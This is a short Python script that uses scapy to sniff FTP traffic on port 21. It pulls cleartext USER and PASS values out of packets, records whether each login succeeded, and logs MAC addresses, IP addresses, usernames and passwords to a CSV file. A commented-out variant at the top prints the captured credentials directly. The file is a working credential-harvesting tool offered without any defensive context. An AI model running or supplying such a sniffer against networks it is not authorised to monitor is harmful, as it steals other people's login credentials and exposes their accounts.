from datetime import datetime
import csv
import os
import queue
from scapy.all import *

#def ftpsniff(pkt):
#    dest = pkt.getlayer(IP).dst
#    raw = pkt.sprintf('%Raw.load%')
#    user = re.findall('(?i)USER (.*)', raw)
#    pwd = re.findall('(?i)PASS (.*)', raw)
#    if user:
#        print( '[*] FTP Login to ' + str(dest))
#        print( '[+] Username: ' + str(user[0]).replace("\\r\\n'",""))
#    elif pwd:
#        print( '[+] Password: ' + str(pwd[0]).replace("\\r\\n'",""))
#
#sniff(filter="tcp port 21", prn=ftpsniff)

class FTPpk():
    
    def __init__(self):
        self.srcMAC = ''
        self.dstMAC = ''
        self.srcIP = ''
        self.dstIP = ''
        self.user=''
        self.pwd = ''
        self.result=''
        
    def check(self):
        if self.srcMAC and self.dstMAC and self.srcIP and self.dstIP and self.user and self.pwd and self.result:
            return True
        else:
            return False

def ftpsniff(pkt):
    if not pack[-1].srcMAC:
        pack[-1].srcMAC = pkt.src
    if not pack[-1].dstMAC:
        pack[-1].dstMAC = pkt.dst
    if not pack[-1].srcIP:
        pack[-1].srcIP = pkt.getlayer(IP).src
    if not pack[-1].dstIP:
        pack[-1].dstIP = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    
    if not pack[-1].user:
        user=re.findall('USER (.*)', raw)
        pack[-1].user = str(user[0]).replace("\\r\\n'","") if user else ''
        
    if not pack[-1].pwd:
        pwd=re.findall('PASS (.*)', raw)
        pack[-1].pwd = str(pwd[0]).replace("\\r\\n'","") if pwd else ''
        
    if not pack[-1].result:
        pack[-1].result= "Failed" if re.search('Sorry',raw) else "Succeed" if re.search('proceed',raw) else ''
        
    if pack[-1].check():
        print("us")
        csv_write.writerow([datetime.now(),pack[-1].srcMAC,pack[-1].srcIP,pack[-1].dstMAC,
                       pack[-1].dstIP,pack[-1].user,pack[-1].pwd,pack[-1].result])
        pack.append(FTPpk())

pack=[]
pack.append(FTPpk())
out=open("ftp.csv",'a',encoding='utf-8')
csv_write = csv.writer(out)
sniff(filter="tcp port 21", prn=ftpsniff,timeout=10)
print("finish")
out.close()



